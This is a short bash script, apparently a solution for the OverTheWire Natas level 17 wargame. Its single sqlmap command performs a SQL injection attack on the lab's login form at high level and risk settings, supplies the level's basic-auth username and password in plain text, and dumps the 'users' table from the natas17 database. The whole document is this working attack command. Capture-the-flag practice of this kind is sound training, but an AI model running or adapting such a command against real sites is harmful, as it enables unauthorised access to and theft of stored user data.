#!/bin/bash

sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas17 --auth-type=basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --dbms=mysql --level=5 --risk=3 -D natas17 -T users --dump;

